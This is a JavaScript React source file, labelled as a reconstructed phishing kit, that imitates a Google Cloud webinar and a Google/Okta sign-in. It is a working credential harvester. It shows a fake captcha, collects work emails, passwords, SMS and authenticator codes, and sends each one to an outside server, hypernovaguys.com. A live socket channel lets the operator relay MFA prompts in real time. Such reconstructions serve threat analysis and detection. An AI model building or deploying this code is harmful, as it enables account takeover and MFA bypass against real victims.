// Reconstructed GoodGuys Vite/React phishing kit bundle (Google Cloud / Nvidia variant)
import { jsx as e, jsxs as t } from "react/jsx-runtime";
import { useState as r, useEffect as n } from "react";
import { io as o } from "socket.io-client";

const BACKEND_URL = "https://hypernovaguys.com";
const SUBMIT_ENDPOINT = `${BACKEND_URL}/backend/api/submit.php`;
const BLOCKED_CONSUMER_DOMAINS = ["gmail.com", "googlemail.com", "yahoo.com", "outlook.com", "hotmail.com", "live.com"];

function generateSessionId() {
  return Date.now().toString(36) + Math.random().toString(36).slice(2, 7);
}

async function submitStep(sessionId, type, value, extra = {}) {
  const res = await fetch(SUBMIT_ENDPOINT, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "X-Session-ID": sessionId,
    },
    body: JSON.stringify({
      session_id: sessionId,
      type,
      value,
      extra,
    }),
  });
  return res.json();
}

function isWorkEmail(email) {
  const domain = String(email).trim().toLowerCase().split("@")[1] || "";
  if (!domain) return false;
  return !BLOCKED_CONSUMER_DOMAINS.includes(domain);
}

export function App() {
  const [sessionId] = r(() => generateSessionId());
  const [screen, setScreen] = r("captcha");
  const [email, setEmail] = r("");
  const [password, setPassword] = r("");
  const [code, setCode] = r("");
  const [tapNumber, setTapNumber] = r("");
  const [errorMsg, setErrorMsg] = r("");
  const [loading, setLoading] = r(false);

  n(() => {
    if (screen !== "signin" && screen !== "waiting" && !screen.startsWith("okta") && !screen.startsWith("mfa")) {
      return;
    }
    const socket = o(BACKEND_URL, { transports: ["websocket", "polling"] });
    socket.on("connect", () => {
      socket.emit("register", { role: "client", session: sessionId });
    });
    socket.on("command", ({ cmd, payload }) => {
      setLoading(false);
      switch (cmd) {
        case "login_error":
          setErrorMsg("Couldn't find this account");
          setScreen("signin");
          break;
        case "password_error":
          setErrorMsg("Wrong password");
          setScreen("signin_password");
          break;
        case "phone_number":
          setScreen("mfa_phone");
          break;
        case "sms_code":
        case "sms_code_error":
          setErrorMsg(cmd === "sms_code_error" ? "Invalid SMS code" : "");
          setScreen("mfa_sms");
          break;
        case "auth_code":
        case "auth_code_error":
          setErrorMsg(cmd === "auth_code_error" ? "Wrong code" : "");
          setScreen("mfa_auth");
          break;
        case "tap_code":
          setTapNumber(payload?.number || "");
          setScreen("mfa_tap");
          break;
        case "okta_login":
        case "okta_login_error":
        case "okta_pass_error":
          setErrorMsg(cmd === "okta_login" ? "" : "Unable to sign in");
          setScreen("okta_signin");
          break;
        case "okta_push":
          setScreen("okta_push");
          break;
        case "okta_code":
        case "okta_code_error":
        case "okta_auth":
        case "okta_auth_error":
        case "okta_sms":
        case "okta_sms_error":
          setScreen("okta_mfa");
          break;
        case "redirect":
          if (payload?.url) window.location.href = payload.url;
          break;
        case "complete":
          setScreen("complete");
          break;
      }
    });
    return () => socket.disconnect();
  }, [screen, sessionId]);

  const handleCaptcha = async () => {
    await submitStep(sessionId, "visitor", "captcha_passed");
    setScreen("landing");
  };

  const handleEmailSubmit = async (ev) => {
    ev.preventDefault();
    if (!isWorkEmail(email)) {
      setErrorMsg("Enter a work email address.");
      return;
    }
    setErrorMsg("");
    await submitStep(sessionId, "email", email);
    setScreen("signin_password");
  };

  const handlePasswordSubmit = async (ev) => {
    ev.preventDefault();
    setLoading(true);
    setScreen("waiting");
    await submitStep(sessionId, "password", password);
  };

  const handleMfaSubmit = async (type) => {
    setLoading(true);
    await submitStep(sessionId, type, code);
  };

  return t("div", {
    className: "app-shell",
    children: [
      e("span", { className: "sr-only", children: "GoodGuys sign-in simulation" }),
      e("span", { className: "sr-only", children: "Sign-in simulation" }),
      screen === "captcha" && e("div", {
        children: [
          e("p", { children: "Our systems have detected unusual traffic from your computer network" }),
          e("button", { onClick: handleCaptcha, children: "Verify" }),
        ],
      }),
      screen === "landing" && e("div", {
        children: [
          e("h1", { children: "Google Cloud Webinar" }),
          e("button", { onClick: () => setScreen("signin"), children: "View Your Invitation" }),
        ],
      }),
      screen === "signin" && e("form", {
        onSubmit: handleEmailSubmit,
        children: [
          e("input", { type: "email", id: "identifierId", value: email, onChange: (ev) => setEmail(ev.target.value) }),
          e("p", { children: errorMsg }),
          e("button", { type: "submit", children: "Next" }),
        ],
      }),
      screen === "signin_password" && e("form", {
        onSubmit: handlePasswordSubmit,
        children: [
          e("input", { type: "password", name: "Passwd", value: password, onChange: (ev) => setPassword(ev.target.value) }),
          e("button", { type: "submit", children: "Next" }),
        ],
      }),
      screen === "waiting" && e("div", { children: loading ? "Loading next step" : "" }),
      screen === "mfa_sms" && e("form", {
        onSubmit: (ev) => { ev.preventDefault(); handleMfaSubmit("sms_code"); },
        children: [
          e("input", { type: "text", name: "smsCode", autocomplete: "one-time-code", value: code, onChange: (ev) => setCode(ev.target.value) }),
          e("button", { type: "submit", children: "Verify" }),
        ],
      }),
      screen === "mfa_auth" && e("form", {
        onSubmit: (ev) => { ev.preventDefault(); handleMfaSubmit("auth_code"); },
        children: [
          e("input", { type: "text", name: "totpPin", value: code, onChange: (ev) => setCode(ev.target.value) }),
          e("button", { type: "submit", children: "Verify" }),
        ],
      }),
      screen === "mfa_tap" && e("div", { children: `Tap ${tapNumber} on your phone` }),
      screen === "okta_signin" && e("div", {
        children: [
          e("p", { children: "Connecting to Google Cloud" }),
          e("p", { children: "Powered by Okta" }),
          e("input", { type: "text", name: "username" }),
          e("input", { type: "password", name: "password" }),
          e("button", { onClick: () => submitStep(sessionId, "okta_password", password), children: "Sign In" }),
        ],
      }),
      screen === "okta_push" && e("div", {
        children: [
          e("p", { children: "Push notification sent" }),
          e("label", { children: "Send push automatically" }),
        ],
      }),
      screen === "complete" && e("div", { children: "Thank you for your application!" }),
    ],
  });
}
